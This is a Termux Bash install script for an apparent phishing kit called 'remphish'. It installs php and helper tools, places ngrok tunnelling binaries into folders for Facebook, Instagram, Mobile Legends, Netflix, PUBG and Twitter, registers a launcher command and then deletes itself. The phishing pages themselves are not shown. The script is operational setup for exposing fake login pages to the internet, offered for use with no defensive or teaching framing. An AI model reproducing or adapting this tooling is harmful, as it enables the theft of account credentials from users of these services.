apt install curl -y
apt install jq
apt install php
#DELETING Ngrok
rm -rf ~/remphish/fb/ngrok
rm -rf ~/remphish/insta/ngrok
rm -rf ~/remphish/MLBB/ngrok
rm -rf ~/remphish/Netflix/ngrok
rm -rf ~/remphish/pubg/ngrok
rm -rf ~/remphish/twitter/ngrok
#COPYING NGROK
cp -R ~/ngrok ~/remphish/fb
cp -R ~/ngrok ~/remphish/insta
cp -R ~/ngrok ~/remphish/MLBB
cp -R ~/ngrok ~/remphish/Netflix
cp -R ~/ngrok ~/remphish/pubg
cp -R ~/ngrok ~/remphish/twitter
#Permission
cd
cd remphish
chmod +x ~/remphish/fb/ngrok
chmod +x ~/remphish/insta/ngrok
chmod +x ~/remphish/MLBB/ngrok
chmod +x ~/remphish/Netflix/ngrok
chmod +x ~/remphish/pubg/ngrok
chmod +x ~/remphish/twitter/ngrok
cd
cat <<EOF>~/url
bash ~/remphish/Start.sh
EOF
cp -f ~/url /data/data/com.termux/files/usr/bin/remphish
chmod +x /data/data/com.termux/files/usr/bin/remphish
cd
rm -rf url
clear
echo
printf "\e[1;92m         TYPE remphish and hit enter to run\e[0m"
echo
echo
rm -rf ~/remphish/Install.sh
